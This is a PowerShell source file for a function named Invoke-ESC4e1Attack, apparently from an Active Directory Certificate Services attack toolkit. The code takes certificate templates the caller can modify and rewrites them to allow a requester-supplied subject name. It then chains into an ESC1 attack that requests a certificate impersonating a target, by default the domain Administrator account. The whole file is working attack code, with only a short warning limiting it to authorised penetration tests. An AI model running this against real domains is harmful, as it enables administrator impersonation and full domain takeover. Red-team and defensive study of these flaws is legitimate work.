function Invoke-ESC4e1Attack {
    <#
        .SYNOPSIS
        Performs an ESC4e1 attack by converting vulnerable templates to ESC1 and executing the attack.

        .DESCRIPTION
        This function takes the output from Find-ESC4e1 (ESC4 vulnerabilities with enabled templates),
        converts the vulnerable templates to ESC1 vulnerabilities using ConvertTo-ESC1, and then
        executes the ESC1 attack using Invoke-ESC1Attack.
        
        ESC4e1 attacks exploit certificate templates that the attacker can modify and are enabled
        on Certificate Authorities. The attack process:
        1. Identify vulnerable templates that can be modified (ESC4)
        2. Convert the template to be ESC1 vulnerable (allow SAN spoofing)
        3. Execute the ESC1 attack to obtain a certificate impersonating a target principal
        4. Use the certificate to authenticate as the target principal

        .PARAMETER ESC4e1Result
        A result object from Find-ESC4e1 containing ESC4 vulnerabilities with enabled templates.
        The object should have VulnerableTemplates and ESC4e1Issues properties.

        .PARAMETER CertificateAuthority
        The Certificate Authority to request the certificate from. If not specified, attempts to
        auto-discover available CAs. Format: "CA-SERVER\CA-NAME"

        .PARAMETER TargetPrincipal
        DirectoryEntry object representing the security principal to impersonate in the certificate.
        If not specified, automatically discovers and uses the domain Administrator account (RID 500).

        .PARAMETER WhatIf
        Shows what attack would be performed without actually executing the conversion or attack.

        .INPUTS
        PSCustomObject
        ESC4e1 result objects from Find-ESC4e1 function.

        .OUTPUTS
        PSCustomObject[]
        Returns attack results for each vulnerable template that was converted and attacked.

        .EXAMPLE
        # Find ESC4e1 vulnerabilities and attack them
        $esc4e1Results = Find-ESC4e1 -Issues $AllIssues
        $esc4e1Results | Invoke-ESC4e1Attack

        .EXAMPLE
        # Attack with specific target principal
        $targetUser = Resolve-Principal -Identity "Administrator"
        $esc4e1Results = Find-ESC4e1 -Issues $AllIssues
        Invoke-ESC4e1Attack -ESC4e1Result $esc4e1Results[0] -TargetPrincipal $targetUser

        .EXAMPLE
        # Use WhatIf to see what would happen
        $esc4e1Results = Find-ESC4e1 -Issues $AllIssues
        Invoke-ESC4e1Attack -ESC4e1Result $esc4e1Results[0] -WhatIf

        .NOTES
        WARNING: This function performs actual certificate attacks that can compromise security.
        Only use in authorized penetration testing or red team exercises.
        
        Requires:
        - No external tools; enrollment + PKINIT are pure PowerShell (vendored PSPkinit).
        - Network access to Certificate Authority
        - Appropriate permissions to modify certificate templates and enroll certificates

        .LINK
        https://posts.specterops.io/certified-pre-owned-d95910965cd2
    #>
    [CmdletBinding(SupportsShouldProcess)]
    param (
        [Parameter(Mandatory, ValueFromPipeline)]
        [ValidateNotNull()]
        [PSCustomObject]$ESC4e1Result,
        
        [Parameter()]
        [string]$CertificateAuthority,

        [Parameter()]
        [System.DirectoryServices.DirectoryEntry]$TargetPrincipal
    )


    begin {
        Write-Verbose "[$(Get-Date -Format 'yyyy-MM-dd hh:mm:ss')] Starting $($MyInvocation.MyCommand) on $env:COMPUTERNAME..."

        # Initialize results array
        $attackResults = @()
    }

    process {
        Write-Verbose "Processing ESC4e1 result for principal: $($ESC4e1Result.PrincipalName)"
        
        # Validate input object structure
        if (-not $ESC4e1Result.PSObject.Properties['ESC4e1Issues'] -or 
            -not $ESC4e1Result.PSObject.Properties['VulnerableTemplates']) {
            Write-Warning "Invalid ESC4e1Result object. Expected properties: ESC4e1Issues, VulnerableTemplates"
            return
        }
        
        if ($ESC4e1Result.ESC4e1Issues.Count -eq 0) {
            Write-Warning "No ESC4e1 issues found in result object for principal: $($ESC4e1Result.PrincipalName)"
            return
        }
        
        Write-Host "=== ESC4e1 Attack: $($ESC4e1Result.PrincipalName) ===" -ForegroundColor Red
        Write-Host "Found $($ESC4e1Result.ESC4e1Issues.Count) vulnerable template(s): $($ESC4e1Result.VulnerableTemplates -join ', ')" -ForegroundColor Yellow
        Write-Host ""
        
        # Process each vulnerable template
        foreach ($templateName in $ESC4e1Result.VulnerableTemplates) {
            Write-Host "Attacking template: $templateName" -ForegroundColor Cyan
            
            # Find the corresponding ESC4e1 issue for this template
            $templateIssue = $ESC4e1Result.ESC4e1Issues | Where-Object { 
                $_.DirectoryEntry -and $_.DirectoryEntry.Properties['name'].Value -eq $templateName 
            } | Select-Object -First 1
            
            if (-not $templateIssue) {
                Write-Warning "Could not find ESC4e1 issue for template: $templateName"
                continue
            }
            
            if (-not $templateIssue.DirectoryEntry) {
                Write-Warning "No DirectoryEntry found for template: $templateName"
                continue
            }
            
            $templateDirectoryEntry = $templateIssue.DirectoryEntry
            
            try {
                Write-Host "  Step 1: Converting template to ESC1 vulnerability..." -ForegroundColor Yellow
                
                if ($PSCmdlet.ShouldProcess("Template: $templateName", "Convert to ESC1")) {
                    # Convert the template to ESC1 vulnerable
                    $convertResult = ConvertTo-ESC1 -InputObject $templateDirectoryEntry -PassThru
                    
                    if ($convertResult) {
                        Write-Host "  [+] Successfully converted template to ESC1" -ForegroundColor Green
                        
                        Write-Host "  Step 2: Executing ESC1 attack..." -ForegroundColor Yellow
                        
                        # Build parameters for Invoke-ESC1Attack
                        $esc1Params = @{
                            TemplateObject = $convertResult
                        }
                        
                        # Add optional parameters if provided
                        if ($CertificateAuthority) {
                            $esc1Params.CertificateAuthority = $CertificateAuthority
                        }
                        
                        if ($TargetPrincipal) {
                            $esc1Params.TargetPrincipal = $TargetPrincipal
                        }
                        
                        # Execute the ESC1 attack
                        $attackResult = Invoke-ESC1Attack @esc1Params
                        
                        if ($attackResult) {
                            Write-Host "  [+] ESC1 attack completed successfully" -ForegroundColor Green
                            
                            # Create comprehensive result object
                            $resultObject = [PSCustomObject]@{
                                PSTypeName = 'ESC4e1_Attack_Result'
                                PrincipalName = $ESC4e1Result.PrincipalName
                                PrincipalSID = $ESC4e1Result.PrincipalSID
                                TemplateName = $templateName
                                AttackType = "ESC4e1"
                                ConversionSuccess = $true
                                AttackSuccess = $true
                                AttackResult = $attackResult
                                TargetPrincipal = $TargetPrincipal
                                Timestamp = Get-Date
                                ErrorMessage = $null
                            }
                            
                            $attackResults += $resultObject
                            Write-Host "  [+] Attack result stored" -ForegroundColor Green
                        } else {
                            Write-Host "  [x] ESC1 attack failed or returned no result" -ForegroundColor Red
                            
                            $resultObject = [PSCustomObject]@{
                                PSTypeName = 'ESC4e1_Attack_Result'
                                PrincipalName = $ESC4e1Result.PrincipalName
                                PrincipalSID = $ESC4e1Result.PrincipalSID
                                TemplateName = $templateName
                                AttackType = "ESC4e1"
                                ConversionSuccess = $true
                                AttackSuccess = $false
                                AttackResult = $null
                                TargetPrincipal = $TargetPrincipal
                                Timestamp = Get-Date
                                ErrorMessage = "ESC1 attack failed or returned no result"
                            }
                            
                            $attackResults += $resultObject
                        }
                    } else {
                        Write-Host "  [x] Failed to convert template to ESC1" -ForegroundColor Red
                        
                        $resultObject = [PSCustomObject]@{
                            PSTypeName = 'ESC4e1_Attack_Result'
                            PrincipalName = $ESC4e1Result.PrincipalName
                            PrincipalSID = $ESC4e1Result.PrincipalSID
                            TemplateName = $templateName
                            AttackType = "ESC4e1"
                            ConversionSuccess = $false
                            AttackSuccess = $false
                            AttackResult = $null
                            TargetPrincipal = $TargetPrincipal
                            Timestamp = Get-Date
                            ErrorMessage = "Failed to convert template to ESC1"
                        }
                        
                        $attackResults += $resultObject
                    }
                } else {
                    Write-Host "  [i] WhatIf: Would convert template $templateName to ESC1 and execute attack" -ForegroundColor Gray
                    
                    $resultObject = [PSCustomObject]@{
                        PSTypeName = 'ESC4e1_Attack_Result'
                        PrincipalName = $ESC4e1Result.PrincipalName
                        PrincipalSID = $ESC4e1Result.PrincipalSID
                        TemplateName = $templateName
                        AttackType = "ESC4e1"
                        ConversionSuccess = $null
                        AttackSuccess = $null
                        AttackResult = $null
                        TargetPrincipal = $TargetPrincipal
                        Timestamp = Get-Date
                        ErrorMessage = "WhatIf simulation"
                    }
                    
                    $attackResults += $resultObject
                }
                
            } catch {
                Write-Host "  [x] Error during ESC4e1 attack: $($_.Exception.Message)" -ForegroundColor Red
                Write-Verbose "Full error details: $($_.Exception | Format-List * | Out-String)"
                
                $resultObject = [PSCustomObject]@{
                    PSTypeName = 'ESC4e1_Attack_Result'
                    PrincipalName = $ESC4e1Result.PrincipalName
                    PrincipalSID = $ESC4e1Result.PrincipalSID
                    TemplateName = $templateName
                    AttackType = "ESC4e1"
                    ConversionSuccess = $false
                    AttackSuccess = $false
                    AttackResult = $null
                    TargetPrincipal = $TargetPrincipal
                    Timestamp = Get-Date
                    ErrorMessage = $_.Exception.Message
                }
                
                $attackResults += $resultObject
            }
            
            Write-Host ""
        }
    }

    end {
        Write-Verbose "ESC4e1 attack processing complete. Processed $($attackResults.Count) template(s)"
        
        if ($attackResults.Count -gt 0) {
            $successfulAttacks = ($attackResults | Where-Object { $_.AttackSuccess -eq $true }).Count
            $failedAttacks = ($attackResults | Where-Object { $_.AttackSuccess -eq $false }).Count
            $whatIfAttacks = ($attackResults | Where-Object { $_.AttackSuccess -eq $null }).Count
            
            Write-Verbose "Attack Summary:"
            Write-Verbose "  Successful attacks: $successfulAttacks"
            Write-Verbose "  Failed attacks: $failedAttacks"
            Write-Verbose "  WhatIf simulations: $whatIfAttacks"
        }
        
        Write-Verbose "[$(Get-Date -Format 'yyyy-MM-dd hh:mm:ss')] Finishing $($MyInvocation.MyCommand) on $env:COMPUTERNAME..."
        
        # Return the attack results
        return $attackResults
    }
}